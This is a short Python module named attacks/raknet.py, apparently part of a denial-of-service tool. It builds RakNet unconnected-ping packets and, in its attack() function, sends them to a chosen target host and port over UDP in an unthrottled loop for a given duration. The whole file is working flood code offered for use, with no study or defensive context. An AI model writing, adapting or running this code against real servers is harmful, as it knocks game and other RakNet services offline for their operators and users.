# attacks/raknet.py

import socket
import time
import struct

RAKNET_MAGIC = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
CLIENT_GUID = 0x123456789ABCDEF0

def build_unconnected_ping(key):
    timestamp = int(time.time() * 1000)
    data = struct.pack('>BQ', 0x01, timestamp) + RAKNET_MAGIC + struct.pack('>Q', CLIENT_GUID)
    return key + data

def attack(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    while time.time() < end_time:
        packet = build_unconnected_ping(b'\x00' * 32)
        sock.sendto(packet, (target, port))

    sock.close()
